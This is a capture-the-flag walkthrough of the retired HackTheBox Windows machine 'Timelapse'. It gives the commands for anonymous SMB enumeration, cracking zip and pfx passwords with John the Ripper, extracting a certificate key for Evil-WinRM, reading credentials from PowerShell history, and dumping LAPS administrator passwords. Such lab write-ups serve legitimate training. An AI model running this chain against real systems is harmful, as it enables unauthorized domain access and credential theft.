---
layout: post
title: Timelapse
date: 2025-06-22 00:34:00 +0800
categories: [HackTheBox, Easy]
tags: [SMB, Zip Cracking, JohnTheRipper, PFX Cracking, WinRM, PowerShell History, LAPS Abuse, Privilege Escalation]
author: klein
image:
  path: /images/images-timelapse/image_19.png
  
---

Since this is a retired machine, the Guided mode is available when progressing through the box. In some cases, I prefer this approach to solving a retired machine, as it demonstrates how it was intended to be used and teaches more effectively.

###### What is the common name on TLS/SSL certificate returned from one of the open TCP ports on Timelapse?

One way of finding this out is by taking a look at the Nmap scan results.

```bash
nmap -sC -sV -vv -oN timelapse 10.129.227.113
```

![b](/images/images-timelapse/image_01.png)

###### What TCP port is SMB running on?

![b](/images/images-timelapse/image_02.png)

An easy one to answer.

###### What tool from the John The Ripper tool suite can be used to generate a hash that can be used by John The Ripper from a password-protected zip file in a format ?

With a little bit of Google Dorking, this can easily be found out.

![b](/images/images-timelapse/image_03.png)

![b](/images/images-timelapse/image_04.png)

###### What tool from the John The Ripper tool suite can be used to generate a hash that can be used by John The Ripper from a pfx file?

This question can be answered based on the previous tool, the solution is pfx2john.

###### What is the default port for the Windows Remote Management or WinRM service over HTTP (not HTTPS)?

This can also be easily answered with a Google search.

![b](/images/images-timelapse/image_05.png)

###### Using Evil-WinRM, the -c flag will allow the user to provide a certificate. What flag can be used to provide a private key?

![b](/images/images-timelapse/image_06.png)

###### Submit the flag located on the legacyy user's desktop.

This is where all the previously answered questions come together.

We can list the available shares on the target machine with the following command:

```bash
nxc smb 10.129.227.113 -u '.' -p '' --shares
```

![b](/images/images-timelapse/image_07.png)

Let's connect to the 'Shares' one.

```bash
smbclient -U '.' //10.129.227.113/Shares
```

Let's download the .zip file from the share.

![b](/images/images-timelapse/image_08.png)

Let's use zip2john to extract the hash and crack it.

```bash
zip2john winrm_backup.zip > zip_hash
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash
```

The password will be: 

![b](/images/images-timelapse/image_09.png)

Let's unzip the file. This is going to leave us with a .pfx file. By doing to same process as before we can extract and crack the hash to get to the certificate and private key that is going to grant access to the box.

```bash
pfx2john legacyy_dev_auth.pfx > pfx_hash
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt pfx_hash
```

The password will be:

![b](/images/images-timelapse/image_10.png)

Now we can extract the certificate and the private key. I like to use the command line way of doing this rather than copy pasting because it eliminates the chance of leaving a blank enter or something that could interfere with the usage of the cert/key later on.

To get the private key
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```

To get the public key
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out key.cert -nodes
```

Because this was the SSL version of WinRM, you will have to provide the -S flag in order to connect.

```bash
evil-winrm -S -i 10.129.227.113 -c key.cert -k key.pem
```

By the way, I did not include in the screenshots, but there were other files on the SMB share. Those were LAPS documentation files, on a CTF I like to download the file, get its MD5sum hash, and put it into Virustotal. This way it gives a clue if it's something modified (meaning it needs further attention) or the original documentation files made by Microsoft.

```bash
md5sum filename 
```

Now we have a shell on the box and have the privileges to submit the user flag.

![b](/images/images-timelapse/image_11.png)

###### What is the full path used to read PowerShell history file, starting from $env:?

This can also be found with the help of Google. I used the post that 0xdf wrote previously.

![b](/images/images-timelapse/image_12.png)

https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html


###### What user's password can be found in that PowerShell history file?

![b](/images/images-timelapse/image_13.png)


###### What non-standard group is svc_deploy a part of?

Let's use the following command to find out about this information:

```bash
net user svc_deploy
```

![b](/images/images-timelapse/image_14.png)


###### What is the acronym LAPS short for?

This can easily be found with a Google search:

![b](/images/images-timelapse/image_15.png)

###### What is the name of the property on an active directory computer object that contains the LAPS-generated password for the administrator account?

As usual, a Google search definitely gives an answer to this question, as well.

![b](/images/images-timelapse/image_16.png)


###### Submit the flag located on the TRX user's desktop.

To do this I read the LAPS-generated password that belongs to the local administrator. To do that I used to following command that can be found in this article.

https://www.powershellgallery.com/packages/Get-ADComputers-LAPS-Password/2.0/Content/Get-ADComputers-LAPS-Password.ps1

Also, first I connected to the machine with the newly found creds.

```bash
evil-winrm -S -i 10.129.227.113 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

```bash
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
```
![b](/images/images-timelapse/image_17.png)

With this password, let's connect to the Administrator account.

![b](/images/images-timelapse/image_18.png)

From here just go the the TRX user's Desktop and submit the root flag as well.